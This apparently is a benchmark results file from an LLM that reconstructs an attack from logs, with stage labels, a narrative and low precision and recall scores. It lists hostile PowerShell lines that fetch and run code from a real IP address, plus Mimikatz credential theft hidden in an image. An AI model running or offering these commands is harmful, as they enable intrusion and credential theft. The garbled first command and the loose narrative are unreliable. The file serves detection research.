@@ -1,0 +1,96 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\u2605\u670d\u6536\u5668'\u2467\u2466\u060c\u3010\u2705\u2605\u2605\u2605\u2605\u2605\u2467\u2466\u060c\u3011 ps1",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1134.001 -TestNumbers 1",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Copy-Item '.\\msxsl.exe' 'c:\\Windows\\Temp\\msxsl.exe'",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Import-Module .\\Invoke-PSImage.ps1;Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\995647.jpg",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"invoke-webrequest http://124.223.85.207:8082/Test.hta -method 'post'-usebasicparsing -contenttype \\\"application/json\\\"\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /C \"echo [InternetShortcut] > %temp%\\T1547.009_modified_shortcut.url & echo URL=C:\\\\windows\\\\system32\\\\calc.exe >>>> %temp%\\T1547.009_modified_shortcut.url & %temp%\\T1547.009_modified_shortcut.url\\\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe & {(Get-Service)",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe & {Get-ChildItem Env:",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe & {Get-Process}",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c \"&(\\$(irm 'http://124.223.85.207:8082/a').value)\"",
+        "stage": "Collection"
+      }
+    ],
+    "narrative": "The system was accessed via exploitation of a vulnerability through the execution of malicious PowerShell commands. The attackers then were able to escalate their privilege level via the use of an Atomic Test, invoking PS Image for script injection using images as well as executing invoke-mimikatz to steal hashes. They communicated with an untrusted source to receive new instructions and download files. To avoid detection they created a shortcut internet link pointing towards windows built-in programs like calculator. Attackers showed knowledge of the target system discovering running services, environment variables and active processes. Lastly, they utilized image steganography techniques combined with command and control methods to collect further data.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 121556,
+      "completion_tokens": 2548,
+      "total_tokens": 124104,
+      "wall_clock_s": 153.013,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.18181818181818182,
+      "recall": 0.09090909090909091,
+      "f1": 0.12121212121212123,
+      "tp": 2,
+      "fp": 9,
+      "fn": 20
+    },
+    "stage": {
+      "precision": 0.18181818181818182,
+      "recall": 0.08695652173913043,
+      "f1": 0.1176470588235294,
+      "tp": 2,
+      "fp": 9,
+      "fn": 21,
+      "recall_partial": 0.10869565217391304
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 121556,
+      "completion_tokens": 2548,
+      "total_tokens": 124104,
+      "wall_clock_s": 153.013,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "scale_v3",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": false,
+    "got_link_hints": false
+  }
+}
